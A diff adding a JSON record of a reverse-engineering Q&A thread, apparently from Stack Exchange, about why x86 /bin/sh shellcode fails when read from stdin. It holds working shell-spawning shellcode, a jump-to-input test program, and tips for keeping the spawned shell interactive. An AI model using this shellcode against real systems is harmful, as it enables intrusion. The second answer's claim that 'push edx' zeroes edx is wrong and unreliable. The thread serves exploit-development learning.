@@ -1,0 +1,60 @@
+{
+    "title": "Basic shellcode doesn't work when read from stdin",
+    "link": "https://reverseengineering.stackexchange.com/questions/16553/basic-shellcode-doesnt-work-when-read-from-stdin",
+    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I am working on a basic shellcode that will spawn a shell after getting called in a 32-bit program.\nHere is the shellcode i'm using:\n </p>\n <pre><code>xor    %eax,%eax  \npush   %eax  \npush   $0x68732f2f  \npush   $0x6e69622f  \nmov    %esp,%ebx  \npush   %eax  \npush   %ebx  \nmov    %esp,%ecx  \nmov    $0xb,%al  \nint    $0x80  \n</code></pre>\n <p>\n  (Source:\n  <a href=\"http://shell-storm.org/shellcode/files/shellcode-827.php\" rel=\"nofollow noreferrer\">\n   http://shell-storm.org/shellcode/files/shellcode-827.php\n  </a>\n  )\n </p>\n <p>\n  I am successfully using this shellcode when i hardcode it inside the exploited program:\n </p>\n <pre><code>char *shellcode = \"\\x31[...]x80\";  \nint main(void)  \n{  \n    (*(void(*)()) shellcode)();  \n    return 0;  \n}  \n</code></pre>\n <p>\n  But when i try to read the shellcode from the standard input, i get a segmentation fault instead. This is the program used:\n </p>\n <pre><code>#include [...]\ntypedef void (*func)(void);\nint main(void)\n{\n    char input[4096];\n    read(0, input, 4096);\n    ((func)&input)();\n    return 0;\n}\n</code></pre>\n <p>\n  When i debug this program with gdb, i can see that everything goes as planned until this instruction:\n </p>\n <pre><code>int    $0x80\n</code></pre>\n <p>\n  Where the program doesn't do anything and continue to the next instruction like nothing happened, which make the program crash.\n </p>\n <p>\n  At first i thought this was because i didn't disabled some execution prevention, but i'm compiling with the following flags:\n </p>\n <pre><code>gcc shell.c -o shell -fno-stack-protector -m32 -z execstack\n</code></pre>\n <p>\n  I could really use help on it, I've been stuck on it all day.\n </p>\n</div>\n</body></html>",
+    "votes": "1",
+    "answers": 2,
+    "views": "2k",
+    "tags": [
+        "x86",
+        "linux",
+        "shellcode"
+    ],
+    "user": "mat",
+    "time": "Oct 15, 2017 at 17:10",
+    "comments": [],
+    "answers_data": [
+        {
+            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  With the shellcode given I was not able to get a shell. If you\n  <code>\n   strace\n  </code>\n  the binary when getting input from the stack\n </p>\n <pre><code>execve(\"/bin//sh\", [\"/bin//sh\"], [/* 0 vars */]) = -1 EFAULT (Bad address)\n</code></pre>\n <p>\n  <code>\n   char *const envp[]\n  </code>\n  is passed in edx register which is not properly set. To patch this I changed shellcode to this\n </p>\n <pre><code> 0:    31 c0                    xor    eax, eax\n 2:    50                       push   eax\n 3:    68 2f 2f 73 68           push   0x68732f2f\n 8:    68 2f 62 69 6e           push   0x6e69622f\n d:    89 e3                    mov    ebx, esp\n f:    50                       push   eax\n10:    53                       push   ebx\n11:    89 e1                    mov    ecx, esp\n13:    b0 0b                    mov    al, 0xb\n15:    31 d2                    xor    edx, edx\n17:    cd 80                    int    0x80\n</code></pre>\n <p>\n  This will zero\n  <code>\n   edx\n  </code>\n  and the execve will run successfully.\n </p>\n <pre><code>execve(\"/bin//sh\", [\"/bin//sh\"], NULL)  = 0\n</code></pre>\n <p>\n  In case where you stored shellcode while compiling, I think it was luck that\n  <code>\n   edx\n  </code>\n  pointed to an address which was 0.\n </p>\n</div>\n</body></html>",
+            "votes": "3",
+            "user": "sudhackar",
+            "time": "Oct 16, 2017 at 2:19",
+            "is_accepted": true,
+            "comments": [
+                {
+                    "user": "mat",
+                    "text": "<span class=\"comment-copy\">Thank you for the answer ! Also thank you for reminding me that i should use strace more often ;)</span>",
+                    "time": null
+                },
+                {
+                    "user": "mat",
+                    "text": "<span class=\"comment-copy\">I do still have a problem: thanks to your modification, the shellcode no longer segfaults, but instead \"nothing\" happens. The program exits normaly and no shell is spawned.   Strace tells me that execve is used correctly (execve(\"/bin//sh\", [\"/bin//sh\"], NULL)  = 0) but nothing happens. In case it helps, here is the full output from strace: <a href=\"https://pastebin.com/Mt3uhSzf\" rel=\"nofollow noreferrer\">pastebin.com/Mt3uhSzf</a>   I don't get much info from gdb, i just see that he can't access an adress after executing bin/dash.   Would you have an idea about what causes this behavior ?</span>",
+                    "time": null
+                },
+                {
+                    "user": "mat",
+                    "text": "<span class=\"comment-copy\">Adding another post since i somehow can't find how to edit the previous ones.  The problem comes from the first read from the spawned shell where i somehow give a null char which kills it.  Those two sets of commands gives the same result: perl -e 'print \"[payload]\"' &gt; payload.bin   ./vuln &lt; payload.bin  or      perl -e 'print \"[payload]\"' | ./vuln</span>",
+                    "time": null
+                },
+                {
+                    "user": "sudhackar",
+                    "text": "<span class=\"comment-copy\">if your shellcode is in input file, use something like this (cat input ; cat -)|./shell to let the program wait for your input to STDIN once shellcode has been executed.</span>",
+                    "time": null
+                },
+                {
+                    "user": "mat",
+                    "text": "<span class=\"comment-copy\">Wow thank you so much. Your method was the only one working from all i could find !</span>",
+                    "time": null
+                }
+            ]
+        },
+        {
+            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  Different ways answer from\n  <strong>\n   sudhackar\n  </strong>\n  , you can just add\n  <code>\n   push edx\n  </code>\n  to zeroing\n  <code>\n   edx\n  </code>\n  in your shellcode\n </p>\n <pre><code>xor eax, eax\npush eax\npush 0x68732f2f\npush 0x6e69622f\nmov ebx, esp\npush eax\npush ebx\npush edx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n</code></pre>\n</div>\n</body></html>",
+            "votes": "1",
+            "user": "J. Daisy",
+            "time": "Oct 5, 2019 at 9:07",
+            "is_accepted": false,
+            "comments": []
+        }
+    ]
+}
